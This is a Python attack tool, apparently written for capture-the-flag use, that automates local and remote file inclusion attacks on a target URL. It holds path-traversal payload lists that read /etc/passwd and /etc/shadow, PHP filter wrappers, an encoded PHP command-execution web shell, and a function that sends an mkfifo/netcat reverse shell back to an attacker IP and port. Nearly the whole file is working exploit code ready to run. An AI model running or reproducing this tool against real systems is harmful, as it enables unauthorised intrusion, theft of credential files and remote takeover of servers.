#!/usr/bin/python
import urllib.parse
import requests
from bs4 import BeautifulSoup
import time
import colorama
from colorama import Fore, Style
colorama.init()

"""
Created by: Ap3ili
Purpose: This script is mainly for CTFs, nothing more.
REMEMBER TO CHANGE THE IP ADDRESS TO YOUR IP!
"""
def art():
        print("""
             _         _                        _   _        _     _____ ___ 
            / \  _   _| |_ ___  _ __ ___   __ _| |_(_) ___  | |   |  ___|_ _|
           / _ \| | | | __/ _ \| '_ ` _ \ / _` | __| |/ __| | |   | |_   | | 
          / ___ \ |_| | || (_) | | | | | | (_| | |_| | (__  | |___|  _|  | | 
         /_/   \_\__,_|\__\___/|_| |_| |_|\__,_|\__|_|\___| |_____|_|   |___|
                                                                             
        """)

attacker_ip = "10.8.209.119" # YOUR IP CHANGE THIS!
attacker_port = 4242 # THIS IS YOUR LISTENER PORT
basic_payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "..//..//..//etc/passwd",
        "..//..//..//..//etc/passwd",
        "..//..//..//..//..//etc/passwd",
        "..//..//..//..//..//..//etc/passwd",
        "..//..//..//..//..//..//..//etc/passwd",
        "..//..//..//..//..//..//..//..//etc/passwd",
        "../../../etc/passwd%00",
        "../../../../etc/passwd%00",
        "../../../../../etc/passwd%00",
        "../../../../../../etc/passwd%00",
        "../../../../../../../etc/passwd%00",
        "../../../../../../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "....//....//....//....//etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "....//....//....//....//....//....//etc/passwd",
        "....//....//....//....//....//....//....//etc/passwd",
        "....//....//....//....//....//....//....//....//etc/passwd",
        "....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd",
        "..\..\..\..\..\..\..\..\..\..\etc\passwd",
        ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
        "\..\..\..\..\..\..\..\..\..\..\etc\passwd",
]
def green_box():
        return Fore.GREEN + '[+]' + Style.RESET_ALL

def red_box():
        return Fore.RED + '[!]' + Style.RESET_ALL

php_wrappers = [
        "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd",
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd", 
]

remote_shell = [
        "php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cat%20/etc/passwd",
]

directory_traversal = [
        "/var/www/html/config.php",
        "/etc/apache/access.conf",
        "/etc/apache2/apache2.conf",
        "/etc/apache2/conf/httpd.conf",
        "/etc/apache2/httpd.conf",
        "/etc/apache2/sites-available/default",
        "/etc/apache2/vhosts.d/default_vhost.include",
        "/etc/apache/apache.conf",
        "/etc/apache/conf/httpd.conf",
        "/etc/apache/httpd.conf",
        "/etc/apt/sources.list",
        "/etc/chrootUsers",
        "/etc/crontab",
        "/etc/defaultdomain",
        "/etc/default/passwd",
        "/etc/defaultrouter",
        "/etc/fstab",
        "/etc/ftpchroot",
        "/etc/ftphosts",
        "/etc/group",
        "/etc/hosts",
        "/etc/httpd.conf",
        "/etc/shadow",
]

rfi_test = [
        f"http://{attacker_ip}:80/rfi_test.php" # change the port if you don't use port 80 for http.server.
]

def get_remote_shell(target):
    shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc {attacker_ip} {attacker_port} >/tmp/f"
    url_encoded = urllib.parse.quote_plus(shell, safe='')
    rce = f"php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd={url_encoded}"
    rce_url = target + rce
    print(green_box() + "Sending shell...")
    response = requests.get(rce_url)

def find_root(response, target):
        if response.status_code == 200:
                soup = BeautifulSoup(response.content, 'html.parser')
                root_occurrence = soup.find_all(string=lambda text: 'root' in text)
        
                if root_occurrence:
                        print(red_box() + " Payload:", target)
                        return True
        else:
                print("Server error")
        return False

def getURL(target, payload):
        full_url = f"{target}{payload}"
        response = requests.get(full_url)
        return response, full_url



payload_lists = [basic_payloads, php_wrappers, directory_traversal, rfi_test, remote_shell]
def main():
        art()
        print(red_box() + "Please set up a server to test RFI! And include the rfi_test.php test file!")
        print(red_box() + "COMMAND: python3 -m http.server 80")
        input("Press anything to continue. ")

        list_names = ["basic_payloads", "php_wrappers", "directory_traversal", "rfi_test", "remote_shell"]

        print("Example URL: http://10.10.10.10/search.php?page=")
        target = input("\n" + green_box() + " Enter target: ")
        for index, payloads in enumerate(payload_lists):
                list_name = list_names[index]
                print("\n" + green_box() + " Trying:", list_name)
                for payload in payloads:
                        response, full_url = getURL(target, payload) # attaches payload to the end the URL
                        if payloads == remote_shell and find_root(response, full_url):
                                print("\n" + red_box() + " RCE is possible, do you want a shell?")
                                user_shell = input(green_box() + " Remote shell: Y/N: ").lower()
                                if user_shell == "y":
                                        get_remote_shell(target)
                                        exit() # not really needed ngl.

                                elif user_shell == "n":
                                        print("Good bye!")
                                        exit()
                                        

                        if payloads == rfi_test and find_root(response, full_url):
                                print(green_box() + " https://book.hacktricks.xyz/pentesting-web/file-inclusion#file-inclusion")
                                print(red_box() + " RFI is possible!")
                                break

                        if find_root(response, full_url): # if it finds a LFI, it breaks from the current list.
                                break
main()
